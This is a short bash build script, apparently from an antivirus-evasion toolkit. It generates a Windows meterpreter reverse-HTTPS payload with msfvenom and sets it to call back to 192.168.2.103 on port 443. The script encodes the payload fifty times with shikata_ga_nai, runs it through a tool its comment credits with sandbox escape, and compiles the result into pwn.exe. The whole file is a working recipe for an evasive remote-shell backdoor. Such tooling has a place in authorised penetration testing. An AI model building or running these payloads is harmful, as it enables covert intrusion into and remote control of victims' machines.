#!/bin/bash          
# simple example script for building the .exe file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > sc.txt
# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
./make_avet -f sc.txt -q
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
# cleanup
rm sc.txt && echo "" > defs.h
